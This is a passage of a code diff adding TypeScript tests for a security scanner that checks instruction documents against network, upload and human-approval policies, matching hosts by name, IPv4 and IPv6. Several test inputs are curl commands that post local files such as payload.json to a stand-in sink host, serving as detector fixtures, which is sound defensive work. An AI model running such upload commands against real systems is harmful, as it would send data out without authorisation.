+      findings.filter(
+        (finding) => finding.id === "SEC-UNAPPROVED-UPLOAD-DESTINATION",
+      ).length,
+      1,
+      instruction,
+    );
+  }
+});
+
+test("multiline curl policy denials and approvals preserve destination scope", () => {
+  const instruction = continuedShell(
+    "curl https://sink.example.com/upload",
+    "--data-binary @payload.json",
+  );
+  const denied = securityDiagnosticFindings([
+    v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: false
+external_upload_allowed: false
+requires_human_approval: true
+---
+
+\`\`\`bash
+${instruction}
+\`\`\`
+`),
+  ]);
+  for (const id of [
+    "SEC-INSTRUCTION-VIOLATES-POLICY",
+    "SEC-MISSING-HUMAN-APPROVAL-GUARD",
+    "SEC-EXTERNAL-UPLOAD-INSTRUCTION",
+  ]) {
+    assert.equal(denied.filter((finding) => finding.id === id).length, 1, id);
+  }
+
+  const approved = securityDiagnosticFindings([
+    v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: true
+approved_network_destinations: sink.example.com
+external_upload_allowed: true
+approved_upload_destinations: sink.example.com
+requires_human_approval: false
+---
+
+\`\`\`bash
+${instruction}
+\`\`\`
+`),
+  ]);
+  for (const id of [
+    "SEC-INSTRUCTION-VIOLATES-POLICY",
+    "SEC-UNAPPROVED-NETWORK-DESTINATION",
+    "SEC-UNAPPROVED-UPLOAD-DESTINATION",
+    "SEC-MISSING-HUMAN-APPROVAL-GUARD",
+  ]) {
+    assert.equal(
+      approved.some((finding) => finding.id === id),
+      false,
+      id,
+    );
+  }
+  assert.equal(
+    approved.filter(
+      (finding) => finding.id === "SEC-EXTERNAL-UPLOAD-INSTRUCTION",
+    ).length,
+    1,
+  );
+
+  const readOnly = securityDiagnosticFindings([
+    v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: true
+approved_network_destinations: sink.example.com
+external_upload_allowed: true
+approved_upload_destinations: sink.example.com
+---
+
+\`\`\`bash
+${continuedShell("curl https://sink.example.com/data", "--silent")}
+\`\`\`
+`),
+  ]);
+  assert.equal(
+    readOnly.some(
+      (finding) => finding.id === "SEC-EXTERNAL-UPLOAD-INSTRUCTION",
+    ),
+    false,
+  );
+});
+
+test("token-continued curl findings preserve policy and source evidence", () => {
+  const instructions = TOKEN_CONTINUED_CURL_CASES.filter(
+    (expected) =>
+      expected.name === "split upload option" ||
+      expected.name === "split hostname",
+  );
+  const findingsFor = (
+    instruction: string,
+    uploadAllowlist: string,
+    externalUploadAllowed: boolean,
+    requiresHumanApproval: boolean,
+  ) =>
+    securityDiagnosticFindings([
+      v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: true
+approved_network_destinations: sink.example.com
+external_upload_allowed: ${externalUploadAllowed}
+approved_upload_destinations: ${uploadAllowlist}
+requires_human_approval: ${requiresHumanApproval}
+---
+
+\`\`\`bash
+${instruction}
+\`\`\`
+`),
+    ]);
+
+  const assertCompleteEvidence = (
+    findings: Finding[],
+    id: string,
+    instruction: string,
+  ): void => {
+    const matching = findings.filter((finding) => finding.id === id);
+    assert.equal(matching.length, 1, `${id}: ${instruction}`);
+    const evidence = matching[0]?.evidence;
+    assert.ok(evidence);
+    assert.equal(evidence.endLine, evidence.startLine + 1, instruction);
+    assert.equal(evidence.snippet, instruction, instruction);
+  };
+
+  for (const expected of instructions) {
+    const approved = findingsFor(
+      expected.instruction,
+      "sink.example.com",
+      true,
+      false,
+    );
+    assert.equal(
+      approved.some(
+        (finding) =>
+          finding.id === "SEC-UNAPPROVED-UPLOAD-DESTINATION" ||
+          finding.id === "SEC-INSTRUCTION-VIOLATES-POLICY" ||
+          finding.id === "SEC-MISSING-HUMAN-APPROVAL-GUARD",
+      ),
+      false,
+      expected.name,
+    );
+
+    const unapproved = findingsFor(
+      expected.instruction,
+      "approved.example.com",
+      true,
+      false,
+    );
+    assertCompleteEvidence(
+      unapproved,
+      "SEC-UNAPPROVED-UPLOAD-DESTINATION",
+      expected.instruction,
+    );
+
+    const denied = findingsFor(
+      expected.instruction,
+      "sink.example.com",
+      false,
+      false,
+    );
+    assertCompleteEvidence(
+      denied,
+      "SEC-INSTRUCTION-VIOLATES-POLICY",
+      expected.instruction,
+    );
+
+    const approvalRequired = findingsFor(
+      expected.instruction,
+      "sink.example.com",
+      true,
+      true,
+    );
+    assertCompleteEvidence(
+      approvalRequired,
+      "SEC-MISSING-HUMAN-APPROVAL-GUARD",
+      expected.instruction,
+    );
+  }
+});
+
+test("logical curl commands do not cross Markdown or hidden-content boundaries", () => {
+  const cases = [
+    `\`\`\`bash
+curl https://sink.example.com/upload \\
+\`\`\`
+--data @payload.json`,
+    `- curl https://sink.example.com/upload \\
+- --data @payload.json`,
+    `curl https://sink.example.com/upload \\
+<!-- hidden --> --data @payload.json`,
+    `Explain curl https://sink.example.com/upload in ordinary prose \\
+--data @payload.json`,
+    "curl https://sink.example.com/upload " + "\\\\" + "\n--data @payload.json",
+    "curl https://sink.example.com/upload " + "\\" + " \n--data @payload.json",
+    "curl 'https://sink.example.com/upload " + "\\" + "\n--data @payload.json'",
+  ];
+
+  for (const content of cases) {
+    const findings = securityDiagnosticFindings([
+      v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: true
+approved_network_destinations: sink.example.com
+external_upload_allowed: true
+approved_upload_destinations: approved.example.com
+---
+
+${content}
+`),
+    ]);
+    assert.equal(
+      findings.some(
+        (finding) =>
+          finding.id === "SEC-UNAPPROVED-UPLOAD-DESTINATION" ||
+          finding.id === "SEC-EXTERNAL-UPLOAD-INSTRUCTION",
+      ),
+      false,
+      content,
+    );
+  }
+});
+
+test("curl upload options check approved and unapproved hosts in either order", () => {
+  const instructions = [
+    "curl --data @payload.json https://sink.example.com/upload",
+    "curl https://sink.example.com/upload --data @payload.json",
+    "curl -X POST https://sink.example.com/upload",
+    "curl https://sink.example.com/upload -X PUT",
+  ];
+  const findingsFor = (instruction: string, uploadAllowlist: string) =>
+    securityDiagnosticFindings([
+      v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: true
+approved_network_destinations: sink.example.com
+external_upload_allowed: true
+approved_upload_destinations: ${uploadAllowlist}
+---
+
+${instruction}
+`),
+    ]).filter((finding) => finding.id === "SEC-UNAPPROVED-UPLOAD-DESTINATION");
+
+  for (const instruction of instructions) {
+    assert.equal(
+      findingsFor(instruction, "approved.example.com").length,
+      1,
+      instruction,
+    );
+    assert.equal(
+      findingsFor(instruction, "sink.example.com").length,
+      0,
+      instruction,
+    );
+  }
+
+  assert.equal(
+    findingsFor(
+      "curl https://sink.example.com/releases. Explain --data later.",
+      "approved.example.com",
+    ).length,
+    0,
+  );
+});
+
 test("every upload action checks bare hostnames against valid and invalid allowlists", () => {
   const instructions = [
     "PUT uploads.example.com",
@@ -2820,6 +4202,551 @@ ${instruction}
       instruction,
     );
   }
+});
+
+test("local dotted tokens never become network or upload destinations", () => {
+  const localReferences = [
+    ".github/workflows/npm-publish.yml",
+    "tools/release-prep.mjs",
+    "./package.json",
+    "../package.json",
+    "dir/package.json",
+    String.raw`C:\dir\package.json`,
+    "Fetch README.md.",
+    "Publish main.rs.",
+    "Run deploy.sh.",
+    "Publish package.json.",
+    "Fetch renma.config.json.",
+    "Validate npm-publish.yml.",
+    "Copy report.tar.gz.",
+    "Use context.release.prep.",
+    "Read .env.example.",
+    "Submit coverage.xml for local processing.",
+    "Use `renma.config.json` as the local configuration file.",
+    "The ordinary prose label context.release.prep remains repository-local.",
+    "run --config=renma.config.json",
+    "curl --data @payload.json",
+  ];
+  const findings = securityDiagnosticFindings([
+    v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: true
+approved_network_destinations: approved.example.com
+external_upload_allowed: true
+approved_upload_destinations: approved.example.com
+---
+
+${localReferences.join("\n")}
+`),
+  ]).filter(
+    (finding) =>
+      finding.id === "SEC-UNAPPROVED-NETWORK-DESTINATION" ||
+      finding.id === "SEC-UNAPPROVED-UPLOAD-DESTINATION",
+  );
+
+  assert.deepEqual(findings, []);
+});
+
+test("destination association stays within each action clause", () => {
+  const cases = [
+    {
+      line: "Fetch from source.example.com and copy package.json locally.",
+      network: ["source.example.com"],
+      upload: [],
+    },
+    {
+      line: "Fetch from source.example.com and publish release notes locally.",
+      network: ["source.example.com"],
+      upload: [],
+    },
+    {
+      line: "Fetch from source.example.com and upload to sink.example.com.",
+      network: ["source.example.com", "sink.example.com"],
+      upload: ["sink.example.com"],
+    },
+    {
+      line: "Document api.example.com as a label and publish README.md locally.",
+      network: [],
+      upload: [],
+    },
+  ] as const;
+
+  for (const expected of cases) {
+    assert.deepEqual(
+      associatedNetworkDestinations(expected.line).map(
+        (destination) => destination.host,
+      ),
+      expected.network,
+      expected.line,
+    );
+    assert.deepEqual(
+      associatedUploadDestinations(expected.line).map(
+        (destination) => destination.host,
+      ),
+      expected.upload,
+      expected.line,
+    );
+
+    const findings = securityDiagnosticFindings([
+      v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: true
+approved_network_destinations: source.example.com
+external_upload_allowed: true
+approved_upload_destinations: approved.example.com
+---
+
+${expected.line}
+`),
+    ]);
+    assert.equal(
+      findings.filter(
+        (finding) => finding.id === "SEC-UNAPPROVED-NETWORK-DESTINATION",
+      ).length,
+      expected.network.length === 2 ? 1 : 0,
+      expected.line,
+    );
+    assert.equal(
+      findings.filter(
+        (finding) => finding.id === "SEC-UNAPPROVED-UPLOAD-DESTINATION",
+      ).length,
+      expected.upload.length === 1 ? 1 : 0,
+      expected.line,
+    );
+  }
+});
+
+test("local fetch verbs do not violate denied network policy", () => {
+  const local = securityDiagnosticFindings([
+    v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: false
+---
+
+Fetch package.json from the local checkout.
+`),
+  ]);
+  assert.equal(
+    local.some((finding) => finding.id === "SEC-INSTRUCTION-VIOLATES-POLICY"),
+    false,
+  );
+
+  const remote = securityDiagnosticFindings([
+    v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: false
+---
+
+Fetch from api.example.com.
+`),
+  ]);
+  assert.equal(
+    remote.filter((finding) => finding.id === "SEC-INSTRUCTION-VIOLATES-POLICY")
+      .length,
+    1,
+  );
+});
+
+test("unsupported explicit URL transports remain fail-closed permission attempts", () => {
+  for (const [instruction, transport] of [
+    ["Fetch http://[2001:db8:::20]/data.", "http"],
+    ["Fetch http://[fe80::1%25eth0]/data.", "http"],
+    ["Fetch https://[invalid-ipv6]/data.", "https"],
+    ["Fetch //[invalid-ipv6]/data.", "protocol-relative"],
+  ] as const) {
+    const candidates = classifyDestinationCandidates(instruction);
+    assert.equal(candidates.length, 1, instruction);
+    assert.equal(candidates[0]?.kind, "unsupported-host", instruction);
+    assert.equal(candidates[0]?.explicitTransport, transport, instruction);
+    assert.equal(candidates[0]?.destination, undefined, instruction);
+    assert.deepEqual(associatedNetworkDestinations(instruction), []);
+
+    const findings = securityDiagnosticFindings([
+      v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: false
+---
+
+${instruction}
+`),
+    ]);
+    assert.equal(
+      findings.filter(
+        (finding) => finding.id === "SEC-INSTRUCTION-VIOLATES-POLICY",
+      ).length,
+      1,
+      instruction,
+    );
+    assert.equal(
+      findings.some(
+        (finding) => finding.id === "SEC-UNAPPROVED-NETWORK-DESTINATION",
+      ),
+      false,
+      instruction,
+    );
+  }
+
+  const uploadInstruction = "Upload to http://[invalid-ipv6]/data.";
+  const uploadCandidates = classifyDestinationCandidates(uploadInstruction);
+  assert.equal(uploadCandidates.length, 1);
+  assert.equal(uploadCandidates[0]?.kind, "unsupported-host");
+  assert.equal(uploadCandidates[0]?.explicitTransport, "http");
+  assert.equal(uploadCandidates[0]?.destination, undefined);
+  assert.deepEqual(associatedUploadDestinations(uploadInstruction), []);
+
+  const uploadFindings = securityDiagnosticFindings([
+    v2SecurityArtifact(`---
+allowed_data: public
+external_upload_allowed: false
+---
+
+${uploadInstruction}
+`),
+  ]);
+  assert.equal(
+    uploadFindings.filter(
+      (finding) => finding.id === "SEC-INSTRUCTION-VIOLATES-POLICY",
+    ).length,
+    1,
+  );
+  assert.equal(
+    uploadFindings.some(
+      (finding) => finding.id === "SEC-UNAPPROVED-UPLOAD-DESTINATION",
+    ),
+    false,
+  );
+});
+
+test("unsupported explicit transports and local filenames create no allowlist evidence", () => {
+  const findings = securityDiagnosticFindings([
+    v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: true
+approved_network_destinations: approved.example.com
+external_upload_allowed: true
+approved_upload_destinations: approved.example.com
+---
+
+Fetch http://[2001:db8:::20]/data.
+Upload to http://[invalid-ipv6]/data.
+Fetch README.md.
+Publish main.rs.
+Run deploy.sh.
+`),
+  ]).filter(
+    (finding) =>
+      finding.id === "SEC-UNAPPROVED-NETWORK-DESTINATION" ||
+      finding.id === "SEC-UNAPPROVED-UPLOAD-DESTINATION",
+  );
+  assert.deepEqual(findings, []);
+
+  const deniedLocal = securityDiagnosticFindings([
+    v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: false
+external_upload_allowed: false
+---
+
+Fetch README.md.
+Publish main.rs.
+Run deploy.sh.
+`),
+  ]).filter((finding) => finding.id === "SEC-INSTRUCTION-VIOLATES-POLICY");
+  assert.deepEqual(deniedLocal, []);
+});
+
+test("candidate text cannot supply its own network or upload action", () => {
+  const findings = securityDiagnosticFindings([
+    v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: true
+approved_network_destinations: approved.example.com
+external_upload_allowed: true
+approved_upload_destinations: approved.example.com
+---
+
+Validate npm-publish.yml.
+Document api.example.com as an example label.
+Document npm-publish.github.com as an example label.
+`),
+  ]).filter(
+    (finding) =>
+      finding.id === "SEC-UNAPPROVED-NETWORK-DESTINATION" ||
+      finding.id === "SEC-UNAPPROVED-UPLOAD-DESTINATION" ||
+      finding.id === "SEC-EXTERNAL-UPLOAD-INSTRUCTION",
+  );
+
+  assert.deepEqual(findings, []);
+});
+
+test("IPv4 destinations use deterministic network and upload allowlists", () => {
+  const findingsFor = (
+    instruction: string,
+    networkAllowlist: string,
+    uploadAllowlist: string,
+  ) =>
+    securityDiagnosticFindings([
+      v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: true
+approved_network_destinations: ${networkAllowlist}
+external_upload_allowed: true
+approved_upload_destinations: ${uploadAllowlist}
+---
+
+${instruction}
+`),
+    ]);
+
+  const unapprovedNetwork = findingsFor(
+    "Fetch http://10.0.0.20/data.",
+    "10.0.0.21",
+    "192.168.1.20",
+  );
+  assert.equal(
+    unapprovedNetwork.filter(
+      (finding) => finding.id === "SEC-UNAPPROVED-NETWORK-DESTINATION",
+    ).length,
+    1,
+  );
+
+  const approvedNetwork = findingsFor(
+    "Fetch http://10.0.0.20/data/item.",
+    "http://10.0.0.20/data",
+    "192.168.1.20",
+  );
+  assert.equal(
+    approvedNetwork.some(
+      (finding) => finding.id === "SEC-UNAPPROVED-NETWORK-DESTINATION",
+    ),
+    false,
+  );
+
+  const unapprovedUpload = findingsFor(
+    "Upload results to https://192.168.1.20/upload.",
+    "192.168.1.20",
+    "192.168.1.21",
+  );
+  assert.equal(
+    unapprovedUpload.filter(
+      (finding) => finding.id === "SEC-UNAPPROVED-UPLOAD-DESTINATION",
+    ).length,
+    1,
+  );
+
+  const approvedUpload = findingsFor(
+    "Upload results to https://192.168.1.20/upload.",
+    "192.168.1.20",
+    "https://192.168.1.20/upload",
+  );
+  assert.equal(
+    approvedUpload.some(
+      (finding) => finding.id === "SEC-UNAPPROVED-UPLOAD-DESTINATION",
+    ),
+    false,
+  );
+});
+
+test("IPv6 network destinations use canonical exact and path-prefix matching", () => {
+  const cases = [
+    {
+      instruction: "Fetch http://[2001:db8::20]/data.",
+      allowlist: "https://[2001:0db8:0:0:0:0:0:20]",
+      findings: 0,
+    },
+    {
+      instruction: "Fetch http://[2001:db8::20]/data.",
+      allowlist: "https://[2001:db8::21]",
+      findings: 1,
+    },
+    {
+      instruction: "Fetch http://[2001:db8::20]/data/item.",
+      allowlist: "https://[2001:db8::20]/data",
+      findings: 0,
+    },
+    {
+      instruction: "Fetch http://[2001:db8::20]/other.",
+      allowlist: "https://[2001:db8::20]/data",
+      findings: 1,
+    },
+    {
+      instruction: "Fetch https://[2001:db8::20]:8443/data.",
+      allowlist: "https://[2001:db8::20]",
+      findings: 0,
+    },
+    {
+      instruction: "Fetch //[2001:db8::20]/data.",
+      allowlist: "https://[2001:db8::20]",
+      findings: 0,
+    },
+    {
+      instruction: "Fetch http://[::1]/health.",
+      allowlist: "http://[::1]",
+      findings: 0,
+    },
+  ] as const;
+
+  for (const expected of cases) {
+    const findings = securityDiagnosticFindings([
+      v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: true
+approved_network_destinations: "${expected.allowlist}"
+---
+
+${expected.instruction}
+`),
+    ]).filter((finding) => finding.id === "SEC-UNAPPROVED-NETWORK-DESTINATION");
+    assert.equal(findings.length, expected.findings, expected.instruction);
+  }
+});
+
+test("IPv6 upload destinations retain separate upload approvals", () => {
+  for (const expected of [
+    {
+      instruction: "Upload results to https://[2001:db8::20]:8443/upload/item.",
+      allowlist: "https://[2001:0db8:0:0:0:0:0:20]/upload",
+      findings: 0,
+    },
+    {
+      instruction: "Upload results to https://[2001:db8::20]:8443/upload/item.",
+      allowlist: "https://[2001:db8::20]/other",
+      findings: 1,
+    },
+    {
+      instruction: "Upload results to https://[2001:db8::20]:8443/upload/item.",
+      allowlist: "https://[2001:db8::21]/upload",
+      findings: 1,
+    },
+    {
+      instruction: "Upload results to //[2001:db8::20]/upload/item.",
+      allowlist: "https://[2001:db8::20]/upload",
+      findings: 0,
+    },
+    {
+      instruction: "Upload results to http://[::1]/upload.",
+      allowlist: "https://[::1]",
+      findings: 0,
+    },
+  ] as const) {
+    const findings = securityDiagnosticFindings([
+      v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: true
+approved_network_destinations: "https://[2001:db8::20]"
+external_upload_allowed: true
+approved_upload_destinations: "${expected.allowlist}"
+---
+
+${expected.instruction}
+`),
+    ]).filter((finding) => finding.id === "SEC-UNAPPROVED-UPLOAD-DESTINATION");
+    assert.equal(findings.length, expected.findings, expected.instruction);
+  }
+});
+
+test("invalid, unbracketed, and zone-qualified IPv6 remain unsupported", () => {
+  for (const instruction of [
+    "Fetch http://[2001:db8:::20]/data.",
+    "Fetch http://2001:db8::20/data.",
+    "Fetch http://[fe80::1%25eth0]/data.",
+  ]) {
+    const candidates = classifyDestinationCandidates(instruction);
+    assert.ok(candidates.length > 0, instruction);
+    assert.equal(
+      candidates.some((candidate) => candidate.destination !== undefined),
+      false,
+      instruction,
+    );
+    assert.deepEqual(associatedNetworkDestinations(instruction), []);
+    assert.deepEqual(
+      associatedUploadDestinations(instruction.replace("Fetch", "Upload to")),
+      [],
+    );
+  }
+});
+
+test("explicit single-label and localhost destinations match exactly", () => {
+  const cases = [
+    {
+      instruction: "Fetch http://artifact-server/upload.",
+      allowlist: "http://artifact-server",
+      findings: 0,
+    },
+    {
+      instruction: "Fetch http://artifact-server/upload.",
+      allowlist: "http://server",
+      findings: 1,
+    },
+    {
+      instruction: "Fetch http://localhost/health.",
+      allowlist: "http://localhost",
+      findings: 0,
+    },
+    {
+      instruction: "Fetch http://api.localhost/health.",
+      allowlist: "http://localhost",
+      findings: 1,
+    },
+  ] as const;
+
+  for (const expected of cases) {
+    const findings = securityDiagnosticFindings([
+      v2SecurityArtifact(`---
+allowed_data: public
+network_allowed: true
+approved_network_destinations: "${expected.allowlist}"
+---
+
+${expected.instruction}
+`),
+    ]).filter((finding) => finding.id === "SEC-UNAPPROVED-NETWORK-DESTINATION");
+    assert.equal(findings.length, expected.findings, expected.instruction);
+  }
+
+  for (const [allowlist, expectedFindings] of [
+    ["http://artifact-server/upload", 0],
+    ["http://server/upload", 1],
+  ] as const) {
+    const uploadFindings = securityDiagnosticFindings([
+      v2SecurityArtifact(`---
+allowed_data: public
+external_upload_allowed: true
+approved_upload_destinations: "${allowlist}"
+---
+
+Upload to http://artifact-server/upload/item.
+`),
+    ]).filter((finding) => finding.id === "SEC-UNAPPROVED-UPLOAD-DESTINATION");
+    assert.equal(uploadFindings.length, expectedFindings, allowlist);
+  }
+
+  assert.deepEqual(associatedNetworkDestinations("Fetch localhost."), []);
+});
+
+test("upload allowlists ignore dotted filenames inside local paths", () => {
+  const findings = securityDiagnosticFindings([
+    v2SecurityArtifact(
+      `---
+allowed_data: public
+external_upload_allowed: true
+approved_upload_destinations:
+  - github.com
+  - api.github.com
+---
+
+Create or validate the annotated tag. Confirm \`.github/workflows/npm-publish.yml\` still triggers on tag pushes and uses npm trusted publishing.
+`,
+      "context",
+    ),
+  ]);
+
+  assert.equal(
+    findings.some(
+      (finding) => finding.id === "SEC-UNAPPROVED-UPLOAD-DESTINATION",
+    ),
+    false,
+  );
 });
 
 test("artifact-local denied upload policy still flags approved upload destinations", () => {
